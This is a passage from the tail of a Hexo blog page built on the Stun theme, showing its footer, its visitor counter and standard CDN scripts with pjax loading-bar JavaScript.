id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>托管于 <a href="https://github.com/crlf01/crlf01.github.io/tree/hexo" rel="noopener" target="_blank">crlf</a></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // 加载进度条的计时器
  var loadingTimer = null;

  // 重置页面 Y 方向上的滚动偏移量
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>